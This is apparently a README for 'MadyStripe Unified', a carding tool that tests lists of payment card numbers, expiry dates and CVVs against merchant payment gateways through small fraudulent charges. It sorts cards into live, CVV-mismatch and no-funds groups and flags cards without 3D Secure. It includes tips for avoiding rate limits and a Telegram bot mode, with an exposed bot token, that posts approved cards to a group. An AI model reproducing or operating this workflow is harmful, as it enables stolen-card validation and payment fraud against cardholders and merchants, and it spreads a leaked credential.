# How to Use MadyStripe Unified

## 📝 Quick Start

### 1. Put Your Cards in a File

Create a text file with your cards (one per line):

```
4532123456789012|12|25|123
5566258985615466|01|26|456
4304450802433666|03|27|789
```

**File name examples:**
- `my_cards.txt`
- `cards_to_check.txt`
- Any `.txt` file name you want

### 2. Run the Checker

```bash
./madystripe.py cli my_cards.txt
```

That's it! The beautiful purple UI will show up and start checking your cards.

---

## 🎯 Common Commands

### Check All Cards in a File
```bash
./madystripe.py cli my_cards.txt
```

### Check Only First 10 Cards
```bash
./madystripe.py cli my_cards.txt -l 10
```

### Save Results to a File
```bash
./madystripe.py cli my_cards.txt -o results.txt
```

### Use Slower Speed (Avoid Rate Limiting)
```bash
./madystripe.py cli my_cards.txt -d 1.0
```

### Check with Different Gateway
```bash
./madystripe.py cli my_cards.txt -g shopify
```

---

## 📁 Card File Format

Your cards file should look like this:

```
NUMBER|MM|YY|CVC
4532123456789012|12|25|123
5566258985615466|01|26|456
4304450802433666|03|27|789
```

**Format:** `CARD_NUMBER|MONTH|YEAR|CVV`

**Example:**
- Card: 4532123456789012
- Month: 12 (December)
- Year: 25 (2025)
- CVV: 123

---

## 🎨 What You'll See

The checker will show a beautiful purple-bordered UI with:

```
╔══════════════════════════════════════════════════════════════════╗
║ LIVE STATS                                                       ║
╠══════════════════════════════════════════════════════════════════╣
║ Card: 4532123456789012|12|25|123                                ║
║ Result: ✅ Charged $0.01                                         ║
║ Type: 🔓 2D | Gateway: Staleks Florida                          ║
╠══════════════════════════════════════════════════════════════════╣
║ Progress: 5/10 (50.0%)                                           ║
║ ██████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░              ║
╠══════════════════════════════════════════════════════════════════╣
║ ✓ 3  ✗ 2  CVV 0  Insuf 0  Err 0                                ║
╠══════════════════════════════════════════════════════════════════╣
║ Success: 60.0%  Live: 60.0%  Speed:  2.00 c/s                  ║
║ Elapsed: 00:02  ETA: 00:02                                      ║
╚══════════════════════════════════════════════════════════════════╝
```

---

## 🔧 Available Gateways

| Gateway | ID | Charge | Speed |
|---------|-----|--------|-------|
| Staleks Florida | `staleks` | $0.01 | Fast (Default) |
| Shopify Optimized | `shopify` | Varies | Medium |
| Saint Vinson | `3` | $20.00 | Medium |
| BGD Fresh | `4` | $6.50 | Medium |

**Default:** Staleks (fastest, cheapest)

---

## 💡 Tips

### For Best Results:
1. **Use Staleks gateway** (default) - fastest and cheapest
2. **Start with small batches** - test with 10-20 cards first
3. **Use rate limiting** - add `-d 1.0` if you get errors
4. **Save your results** - use `-o results.txt`

### If You Get Errors:
```bash
# Slower speed
./madystripe.py cli my_cards.txt -d 2.0

# Try different gateway
./madystripe.py cli my_cards.txt -g shopify

# Check fewer cards
./madystripe.py cli my_cards.txt -l 10
```

---

## 📊 Understanding Results

### Card Status:
- ✅ **Approved** - Card charged successfully
- 🔐 **CVV Mismatch** - Card is live but CVV wrong
- 💰 **Insufficient** - Card is live but no funds
- ❌ **Declined** - Card declined by bank
- ⚠️ **Error** - Technical error

### Card Types:
- 🔓 **2D** - No authentication required
- 🔐 **3D** - 3D Secure v1
- 🛡️ **3DS** - 3D Secure v2

---

## 🤖 Telegram Bot Mode

### Start the Bot:
```bash
./madystripe.py bot
```

**Bot Configuration:**
- Token: `7984658748:AAEvRmO6iBk5gKGIK6Evi5w35_Taw4K6Oe0`
- Group ID: `-5286094140`
- Approved cards will be posted to your group automatically!

### Bot Commands:
- `/start` - Welcome message
- `/gate` - Select gateway
- `/check /path/to/file.txt` - Check file
- `/stats` - View statistics
- `/help` - Show help

### In Telegram:
1. Send a single card: `4532123456789012|12|25|123`
2. Upload a .txt file with cards
3. Use `/check` command with file path

**Note:** All approved/live cards are automatically posted to group `-5286094140`

---

## 📝 Example Session

```bash
# 1. Create your cards file
nano my_cards.txt
# (paste your cards, save and exit)

# 2. Check the cards
./madystripe.py cli my_cards.txt

# 3. Watch the beautiful UI!
# Cards will be checked one by one
# Results shown in real-time

# 4. When done, results are displayed
# Approved cards are listed
# Statistics are shown
```

---

## 🆘 Need Help?

### List Available Gateways:
```bash
./madystripe.py --list-gateways
```

### Show Help:
```bash
./madystripe.py --help
./madystripe.py cli --help
```

### Read Full Guide:
```bash
cat MADYSTRIPE_UNIFIED_GUIDE.md
```

---

## ✅ You're Ready!

Just put your cards in a file and run:
```bash
./madystripe.py cli my_cards.txt
```

That's all you need to know to get started!

---

**Created by @MissNullMe**
**Version: 3.0.0**
